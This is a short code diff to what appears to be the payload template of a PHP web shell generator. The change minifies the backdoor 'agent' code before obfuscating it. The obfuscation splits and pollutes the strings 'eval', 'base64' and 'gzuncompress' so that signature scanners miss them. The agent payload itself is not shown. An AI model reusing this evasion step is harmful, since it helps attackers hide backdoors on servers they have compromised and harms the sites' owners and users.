@@ -4,6 +4,7 @@ import random
 import itertools
 from core import commons
 import string
+import re
 %><%
 def find_substr_not_in_str(str, characters = string.letters + string.digits + '!"#$%&()*+,-./:;<=>?@[\\]^_`{|}~'):
 	while True:
@@ -23,8 +24,13 @@ def obfuscate(str, obf, division, dangerous):
 		if not found:
 			return polluted
 
-obfuscation_agent = find_substr_not_in_str(agent)
-obfuscated_agent = obfuscate(agent, obfuscation_agent, 6, ('eval', 'base64', 'gzuncompress', 'gzcompress')) 
+# Try to minify
+agent_minified = re.sub('[\n\r\t]','',agent)
+# Replace all quotes
+agent_minified = re.sub('\'','"',agent_minified)
+
+obfuscation_agent = find_substr_not_in_str(agent_minified)
+obfuscated_agent = obfuscate(agent_minified, obfuscation_agent, 6, ('eval', 'base64', 'gzuncompress', 'gzcompress')) 
 
 agent_splitted = list(commons.divide(obfuscated_agent, len(obfuscated_agent)/6-10, len(obfuscated_agent)/6-10, 6))
 
